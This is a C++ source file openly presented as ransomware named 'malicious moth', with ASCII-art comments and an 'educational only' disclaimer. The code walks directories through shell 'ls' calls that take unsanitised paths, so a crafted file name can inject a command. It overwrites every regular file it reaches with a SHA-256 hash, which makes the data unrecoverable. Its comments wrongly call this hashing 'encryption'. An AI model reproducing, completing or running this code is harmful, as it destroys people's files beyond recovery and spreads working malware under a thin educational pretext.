#include <iostream>
#include <vector>
#include <filesystem>
#include <string>
#include <math.h>
#include <bitset>
#include <random>
#include <sstream>
#include <fstream>
#include <list>
#include <streambuf>
#include <sys/stat.h>
#include <algorithm>
#include "sha256.h"

using namespace std;

/*                  
                    __________________________
                   /                          \ 
                  |  wanna feel my moth balls? |
                   \_____    _________________/
                         \  / 
                  •   •  / /
                   \ /  / /
                   /^\ /_/
                  / | \
                 /  |  \
                /       \
               |—————————|
            
              malicious moth

be cerfull this ransomeware might just fly away with your decryptor key

this is just a project to be used on a local rassperi pi i have nothing more nothing more... unless ;)
*/



string bin_con(string data){
    string binaryString;
    for (char& _char : data) {
        binaryString += bitset<8>(_char).to_string(); //binaryString + " " + bitset<8>(_char).to_string();
    }
    return binaryString;
}



string salt(string msge){
      try{
            bool debug = true;
            int max = 10000;
            int num_enc;

            stringstream geek(msge);

            geek >> num_enc;

            srand(time(0));
            int key1 = (rand() % max);
            
            
            int b = key1 * msge.length(); 
            
           
            int enc = num_enc + b; 
            int msg = enc;

            string msgr = bitset<126>(msg).to_string();

            string enct = bin_con(msgr);
            return enct;
      }
      catch(invalid_argument){
            bool debug = true;
            if(debug=true){cout << "ERROR" << "\n";}
            string error = "ERROR";
            return error;
      }

}

string enc(string fil){
      struct stat s;
      cout << "file: " << fil << "\n";
      if( stat(fil.c_str(),&s) == 0 )
      {
            if( s.st_mode & S_IFDIR )
            {
                  return fil;
            }
            else if( s.st_mode & S_IFREG )
            {
                  string sa, en;

                  ifstream t(fil);
                  string str((std::istreambuf_iterator<char>(t)),std::istreambuf_iterator<char>());
                  
                  sa = salt(str);
                  en = sha256(sa);
                  cout << "sha256: " << en << "\n";

                  ofstream write(fil);
                  write << en.c_str();
                  write.close();


                  string nu = "NONE";
                  return nu;
            }
            return fil;
      }
      return fil;
}

void find_full(list<string> dir){
      string di;
      for(string x : dir){
            string sr = x;
            cout << "path_full: " << sr << "\n";
            string command = "ls "+sr+" > files.txt";
            system("touch files.txt");
            system(command.c_str());
            std::ifstream file("files.txt");
            std::string str; 
            while (std::getline(file, str))
            {
                  str = x+"/"+str;
                  cout << "path: " << str << "\n";
                  di =  enc(str);
                  if(di != "NONE"){
                        dir.push_front(di);
                  }
            }
            }
}

string find_files_stager(string path){
      std::list<string> dir = {};
      string di;
      string command = "ls "+path+" > files.txt";
      system("touch files.txt");
      system(command.c_str());
      std::ifstream file("files.txt");
      std::string str; 
      while (std::getline(file, str))
      {
            str = path+str;
            cout << "path: " << str << "\n";
            di =  enc(str);
            if(di != "NONE"){
                  dir.push_front(di);
            }
      }
      find_full(dir);
      string h = "hmmm";
      return h;
}


int main(){
      cout << "running...\n";
      string path = "test_files/";
      find_files_stager(path);
      
}



/*

                    _____________________ _ 
                   |                     | |
                   |      _________      | |
                   |     /         \     | |
                   |    /           \    | |
                   |   /             \   | |
                   |  |   \/     \/   |  | |
                   |  |   /\     /\   |  | |
                   |   \             /   | |
                   |    \           /    | |
                   |     \         /     | |
                   |      \_______/      | |
                   |       |     |       | |
                   |      /       \      | |
                   |     | ------- |     | |
                   |     |_________|     | |
                   |                     | |
                   |  TOXIC DEVELOPMENT  | |
                   |_____________________|_|
                      
                  
                  ###########################
                  # PROJECT: malicious moth #
                  ###########################


dev info and theory
by toxic-development

this is a ransome ware but no data can be recovered
goodl luck recovering it if you run it, salts into binary then uses sha256 to encrypt furthere
impossable to crack unless you brute force it


debug log:
set debug to false so it doesn't run these if statments
if(debug == true){}

uses sha256 encryption and uses salting as well
example of what a file will look like after encryption: 9a39d8a0f2122fb6059d0ce212f38c11a3973548f1523e891eed099a546423c3 
yes it is just one big hash

recomend running on a ressperis pi or linux computer that isn't important

*windows support comming soon*


WARNIGN NOT FOR ILLAEGLE PRUPUSES EDUCATIONAL ONLY
*/
